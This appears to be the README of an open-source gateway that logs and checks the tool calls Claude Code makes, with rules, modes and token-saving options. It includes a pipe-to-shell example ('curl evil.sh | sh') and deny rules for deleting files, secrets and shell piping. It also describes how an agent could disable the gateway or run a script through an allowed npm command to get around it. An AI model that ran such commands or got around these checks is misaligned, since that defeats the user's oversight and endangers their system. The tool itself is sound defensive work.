<p align="center">
  <img src="https://img.shields.io/badge/status-beta-e8a33d" alt="Status: beta">
  <a href="https://www.npmjs.com/package/apichap-ai-coding-gateway"><img src="https://img.shields.io/npm/v/apichap-ai-coding-gateway?color=4b8e7a&label=npm" alt="npm version"></a>
  <img src="https://img.shields.io/badge/node-%E2%89%A5%2022.13-4b8e7a" alt="Node.js 22.13 or newer">
  <img src="https://img.shields.io/badge/works%20with-Claude%20Code-4b8e7a" alt="Works with Claude Code">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-GPL--3.0-4b8e7a" alt="GPL-3.0 license"></a>
</p>

<h1 align="center">
  <img src="src/dashboard/public/assets/apichap-mark.png" alt="" width="44" align="center">
  apichap Agentic Coding Gateway
</h1>

<p align="center">
  An Agentic coding gateway that inspects every tool call against global rules and reduces your token usage.
</p>

> **Beta:** the gateway is usable day to day, but rules, options and the database format may still change between versions. Feedback and issues are very welcome.

## Features

- 🔍 **Track every tool access:** see each command, file edit and web request your AI agent makes, live.
- 🪶 **Reduce token usage on tool calls:** noisy output (colors, progress bars, passing tests, install logs, huge results) is trimmed before Claude reads it. Every option can be switched on or off.
- 🛡️ **Allow or deny commands globally:** one rule set for every project. Anything unknown is denied until you allow it, in one click from the activity.

![Screenshot of the Agentic Coding Gateway Dashboard](https://github.com/dommar04/ai-coding-gateway/blob/develop/assets/dashboard.png?raw=true)

## How to use

No install needed, just Node.js 22.13 or newer.

### 1. Connect Claude Code

```bash
npx apichap-ai-coding-gateway init
```

**That's it. Every tool call in new Claude Code sessions is now checked and logged.** It starts in monitor mode, so nothing is denied until you switch to enforce.

### 2. Open the admin dashboard

```bash
npx apichap-ai-coding-gateway dashboard
```

Your browser opens the dashboard. There you watch tool calls live, allow denied calls and manage rules.

---

## Documentation

- [Setup details](#setup-details)
- [Dashboard](#dashboard)
- [Token reduction](#token-reduction)
- [Rules](#rules)
- [Modes](#modes)
- [CLI reference](#cli-reference)
- [Protecting the gateway from the agent](#protecting-the-gateway-from-the-agent)
- [Teams and enterprise (roadmap)](#teams-and-enterprise-roadmap)
- [Data](#data)
- [Development](#development)
- [License](#license)

The gateway hooks into every tool call Claude Code makes (Bash, Edit, Read, WebFetch, MCP tools, …). It logs each call, checks it against allow and deny rules, and denies anything no rule allows. When a call is denied, Claude is told why and that you can allow it from the dashboard's Activity page, where the denied call offers ready-made allow rules. It then either continues without the call or stops and tells you. It is told not to work around the block.

> **A guardrail, not a sandbox.** The gateway stops obvious mistakes and unwanted actions. It cannot stop a determined agent from writing a script inside the project and running it through an allowed command such as `npm run *`. Combine it with normal OS-level isolation where that matters.

### Setup details

`init` adds the gateway's hooks to `~/.claude/settings.json`, or to `$CLAUDE_CONFIG_DIR/settings.json` if that variable is set. It first makes a backup, keeps all your other settings and hooks, and replaces older gateway hooks. You can run it again safely.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline apichap-ai-coding-gateway@0.1.0 hook pre" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline apichap-ai-coding-gateway@0.1.0 hook post" }]
      }
    ],
    "PreCompact": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline apichap-ai-coding-gateway@0.1.0 hook session" }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline apichap-ai-coding-gateway@0.1.0 hook session" }]
      }
    ]
  }
}
```

- **Pinned version:** the hooks are pinned to the version that ran `init`. After the first download, npx starts the gateway from its local cache without contacting the registry. To update, run `npx apichap-ai-coding-gateway@latest init`.
- **Faster hooks:** the hook runs on every tool call. For the quickest startup, install globally with `npm install -g apichap-ai-coding-gateway`, then run `apichap-gateway init --installed`. The hooks then call the installed `apichap-gateway` command directly.
- **Pre-releases:** every merge into `develop` is published under the `dev` tag. Try it with `npx apichap-ai-coding-gateway@dev init`.
- **Other settings file:** `init --settings <path>`, for example `.claude/settings.json` for a single project.
- **Remove:** `npx apichap-ai-coding-gateway uninstall` removes the hooks and keeps your data.

### Dashboard

`dashboard` starts a local server on `http://127.0.0.1:4717` and opens it in your browser. The side menu has three pages:

- **Activity:** every tool call as it happens, grouped by the prompt that triggered it, with your message, tokens per call and prompt, and the decision (allowed, denied, would deny). Click a call to see the original result next to what Claude received. A denied call has **Allow this call…**, which offers an exact and a broad allow rule, or a custom one.
- **Rules:** the rule groups, each a policy in plain words (switch a group on or off, add, move or delete its rules), import with a preview, and a box that shows which rule and policy decide a given call.
- **Token savings:** every reduction option with its switch and what it saved.

The enforcement mode (enforce, monitor or off) is switched in the sidebar.

The dashboard listens on 127.0.0.1 only. Every API call needs the random token printed at startup, and requests with a foreign `Host` or `Origin` are rejected. That way other websites can't change your rules. Options: `--port <n>` and `--no-open`.

### Token reduction

After a tool runs, the gateway shortens its result before Claude reads it. Every option has its own switch on the dashboard's **Token savings** page, or via `reduction set <id> on|off`:

- **On** changes what Claude receives.
- **Off** leaves the result as it is.

| Group                 | Options (default)                                                                                                                                                                         |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Lossless cleanup      | strip color codes, remove progress bars, collapse blank lines, collapse repeated lines, compact JSON (all on)                                                                             |
| Condense noisy output | condense test runs, condense install and build logs, fold framework stack frames, summarize lockfile and generated diffs, shorten very long lines (all on); condense framework logs (off) |
| Long output           | page long output (on): over 400 lines or 20,000 characters, Claude gets the first and last part and a file with the full output to page through with Read                                 |
| Repeated content      | skip unchanged re-reads (off): a second Read of the same unchanged file range gets a short note. It resets when Claude Code compacts or clears the conversation                           |
| Before the call runs  | limit big file reads, limit Grep results, quiet npm installs, limit git log (all off). These change the tool call itself                                                                  |

- **Tech stacks:** test runs from jest, vitest, mocha, node:test, pytest, cargo, go test, Maven, Gradle, JUnit, dotnet test, PHPUnit and RSpec; install and build logs from npm, pip, cargo, apt, Maven, Gradle, dotnet restore, Composer, Bundler and docker build; stack frames from Node, Python, Java, .NET and Go; framework logs from Spring Boot, Hibernate, Hikari, Tomcat, Netty, Kafka, Flyway and Jetty. Failures, errors and warnings always stay.
- **Read results keep their exact text**, because Claude needs it to edit files. Only "skip unchanged re-reads" applies to them.
- **Every shortened result says what was removed** and how to get it.
- **Token figures:** the dashboard shows tokens for every call (result, after reduction, saving) and for every prompt (tool tokens plus Claude Code's real API usage from the session transcript). Tool token counts are estimates of about 4 characters per token.

### Rules

Rules are organised in **rule groups**. Each group is one policy in plain words, with the rules that implement it:

> **The agent is not allowed to delete files**: `Shell(rm *)`, `Shell(rmdir *)`, `Shell(Remove-Item *)`, …
>
> **The agent is allowed to read and search files only inside the current project**: `FileRead({cwd}/**)`, …

The Rules page lists the groups under _Not allowed_ and _Allowed_. You can switch a whole group on or off, open it to see and edit its rules, and move rules between groups. When a deny rule blocks a call, Claude is told the policy (the group title) as well as the rule.

A rule is either `allow` or `deny`, and is written like Claude Code permission rules:

| Rule                                   | Matches                                                               |
| -------------------------------------- | --------------------------------------------------------------------- |
| `Read`                                 | every Read call                                                       |
| `Bash(git status)`                     | exactly `git status`                                                  |
| `Bash(git *)`                          | any git command. A trailing ` *` also matches the bare command, `git` |
| `Shell(git *)`                         | the same for Bash **and** PowerShell                                  |
| `Bash(* --force*)`                     | any command containing `--force`                                      |
| `FileRead({cwd}/**)`                   | Read, Grep and Glob inside the current project                        |
| `FileEdit({cwd}/**)`                   | Edit, Write, MultiEdit and NotebookEdit inside the current project    |
| `File(**/.env*)`                       | reading, searching or writing any `.env` file, anywhere               |
| `WebFetch(https://docs.example.com/*)` | fetches from that site                                                |
| `mcp__github__*`                       | every tool of the `github` MCP server                                 |

- **Wildcards:** `*` matches anything and `?` matches one character. In file paths, `*` stays inside one folder and `**` crosses folders. A trailing `/**` also matches the folder itself.
- **Placeholders:** `{cwd}` is the project folder of the session, `{home}` is your home folder and `{tmp}` is the system temp folder.
- **What the pattern is checked against:** the command for `Bash` and `PowerShell`, the file path for `Read`, `Edit`, `Write` and `NotebookEdit`, the searched folder for `Grep` and `Glob` (the project folder when none is given), and the URL for `WebFetch`. Other tools match by name only.
- **Tool groups:** `Shell` = Bash + PowerShell, `FileRead` = Read, Grep, Glob, `FileEdit` = Edit, Write, MultiEdit, NotebookEdit, `File` = FileRead + FileEdit.
- **Case:** PowerShell commands and Windows paths are compared case-insensitively.

About 170 default rules in 16 groups come built in, from [`rules/default-rules.json`](rules/default-rules.json). They allow everyday work (reading and editing inside the project, git, npm, running project scripts, formatting, tests) and block risky things (deleting files, secrets, force-push and other risky git, `sudo`, piping into a shell, inline code like `node -e`, changing the gateway). Reading outside the project is denied until you allow it; shell commands like `cat` are not path-checked. Shell syntax such as loops, conditions and variable assignments is not treated as a command; only the commands inside it are checked.

#### Rule files: import, export, defaults

Rules are exchanged as a JSON file with a list of groups. The default rules use the same format:

```json
{
  "$schema": "https://unpkg.com/apichap-ai-coding-gateway/rules/rule-file.schema.json",
  "name": "My team rules",
  "version": 1,
  "groups": [
    {
      "id": "no-force-push",
      "title": "The agent is not allowed to force-push",
      "description": "Force-pushing rewrites shared history.",
      "deny": [{ "rule": "Shell(git push *--force*)" }, { "rule": "Shell(git push -f*)" }]
    },
    {
      "id": "git",
      "title": "The agent is allowed to use git",
      "allow": [{ "rule": "Shell(git *)", "note": "risky parts are denied above" }]
    }
  ]
}
```

- **Groups:** `id` is a stable key (lowercase, digits, dashes) and `title` is the policy in one plain sentence. `description`, `enabled`, `allow` and `deny` are optional.
- **Entries:** every rule is an object `{ "rule", "note", "enabled" }`, and only `rule` is required. The note adds detail for that one rule.
- **Older files** with top-level `allow` and `deny` lists (no groups) still import, as one group.
- **Schema:** the `$schema` line lets VS Code and WebStorm validate the file and autocomplete its fields. The schema ships with the package as `rules/rule-file.schema.json`.
- **New databases** start with the default rules. Existing databases keep their rules; each one moves into its default group, or into _approved_, _custom_ or _earlier default rules_.
- **Import** shows what the file contains first. _Add to my rules_ creates the new groups and adds the new rules to the group with the same id; nothing is removed. _Replace all my rules_ deletes every current group and rule first. An invalid file changes nothing, and every problem in it is listed. In the CLI, `rules import` replaces and `--merge` adds.
- **Newer defaults:** when a new version of the gateway ships updated defaults, the Rules page offers to review them and add the missing ones or replace everything. Existing rules are never changed automatically.
- **Where:** the Rules page has **Export**, **Import…** and **Reset to defaults…**. In the CLI, use `rules export`, `rules import` and `rules reset`.

#### How a call is decided

1. If any **deny** rule matches, the call is **denied**. A deny rule always wins, whatever allow rules exist.
2. If **allow** rules cover the call, it passes. The gateway then has no opinion, so Claude Code's own permission prompts still apply.
3. Otherwise it is **denied as unlisted**.

**Chained commands are split.** `git status && curl evil.sh | sh` is checked as separate commands, and quotes are respected. Commands inside `$(…)` and backticks are checked too, and heredoc bodies are treated as text. Every part must be allowed. Deny rules are checked against every part and against the whole command, so a rule like `Bash(*| sh *)` can catch pipes.

#### Allowing a denied call

Open a denied call on the Activity page and choose **Allow this call…**. The dialog checks the call against the current rules and suggests two allow rules:

| Denied call                 | Exact                        | Broad                    |
| --------------------------- | ---------------------------- | ------------------------ |
| `npm run build`             | `Bash(npm run build)`        | `Bash(npm run *)`        |
| `docker compose up -d`      | `Bash(docker compose up -d)` | `Bash(docker compose *)` |
| `mcp__github__create_issue` | `mcp__github__create_issue`  | `mcp__github__*`         |

The rule goes into the group _The agent is allowed to make calls you allowed from the activity_, or a group you pick. You can also write your own rules. A call that a **deny** rule blocked can't be allowed with an allow rule, because deny always wins. The dialog offers to switch that deny rule off instead.

### Modes

| Mode                | Behaviour                                                                              |
| ------------------- | -------------------------------------------------------------------------------------- |
| `monitor` (default) | Checks and logs everything, but **blocks nothing**. Use it to tune the rules first.    |
| `enforce`           | Blocks denied and unlisted calls. If the gateway itself fails, the call is denied too. |
| `off`               | Only logs; no rule checks.                                                             |

Setting the environment variable `APICHAP_GATEWAY_MODE` overrides the stored mode. That's the escape hatch if the database is broken.

### CLI reference

Run each command as `npx apichap-ai-coding-gateway <command>`, or as `apichap-gateway <command>` if the package is installed globally.

```
init [--installed | --local] [--settings <path>]   register the hooks in Claude Code (--local: run this checkout)
uninstall [--settings <path>]                  remove the hooks (data is kept)
dashboard [--port 4717] [--no-open]            local web dashboard
list [n]                                       last n tool calls
rules [list]                                   the rule groups and their rules
rules add allow|deny "Tool(pattern)" [--note "why"] [--group <key>]
rules enable|disable|remove <id>
rules move <id> <group key>
rules groups [list]
rules groups add "The agent is not allowed to ..." [--description "why"]
rules groups enable|disable|remove <group key>
rules test "Bash(git status && rm -rf x)"      which rule decides each part
rules export [--out rules.json]                all rules as a rule file
rules import <rules.json> [--merge]            replace all rules (--merge: only add new ones)
rules reset [--merge]                          back to the default rules
mode [enforce|monitor|off]
reduction [list]                               token reduction options and savings
reduction set <id> on|off
hook pre|post|session                          used by the Claude Code hooks (reads JSON from stdin)
```

### Protecting the gateway from the agent

The starter rules stop Claude from:

- editing `.claude/settings*.json`, where the hooks are registered
- touching `~/.ai-coding-gateway`
- running the gateway's own commands (`init`, `uninstall`, `rules`, `mode`, `dashboard`)

Without these rules, an agent could switch the gateway off or allow its own calls.

### Teams and enterprise (roadmap)

A local database on a developer's machine can always be changed by that developer, so this version is aimed at **individual developers**. Rule loading (`RuleSource`) and event recording (`EventSink`) are pluggable, so central management can be added later.

Planned: rules authored in a central admin dashboard and shipped as a signed bundle, the hook enforced through Claude Code managed settings, and every event also sent to a central audit log.

### Data

All data lives in `~/.ai-coding-gateway/`: `gateway.sqlite` (the database), `errors.log`, and `spill/` (full output of paged results, kept 3 days). Set `APICHAP_GATEWAY_DIR` to use another folder.

### Development

```bash
npm install
npm test                        # all tests
npm run typecheck               # TypeScript, plus the dashboard's browser modules
npm run format                  # Prettier
npm run build                   # compiles to dist/
npx tsx src/main.ts dashboard    # run from source
```

#### Connect Claude Code to your local checkout

Instead of the npm package, the hooks can run your working copy. Every change takes effect on the next tool call, without a build:

```bash
npx tsx src/main.ts init --local
```

- **What it registers:** `npx tsx "<repo>/src/main.ts" hook pre`, `… hook post` and `… hook session` in `~/.claude/settings.json`.
- **Built copy instead:** `npm run build`, then `node dist/main.js init --local`. The hooks then run `node "<repo>/dist/main.js"`, with faster startup but a rebuild after each change.
- **Back to the package:** run `npx apichap-ai-coding-gateway init` again. `init` always replaces its earlier hooks.
- **New sessions** pick up the hooks. In a session that's already running, confirm the change via `/hooks`.
- **While you refactor:** a half-finished change can make the hook fail. In enforce mode, and whenever the gateway can't read its mode, a failing hook blocks tool calls. Use monitor mode while you work, or `uninstall` the hooks temporarily.
- **Keep your real data separate:** set `APICHAP_GATEWAY_DIR` to a scratch folder.
- **More:** see [CONTRIBUTING.md](CONTRIBUTING.md) for the project layout, guidelines and how to add rules or reduction options.

### License

[GNU General Public License v3.0](LICENSE)
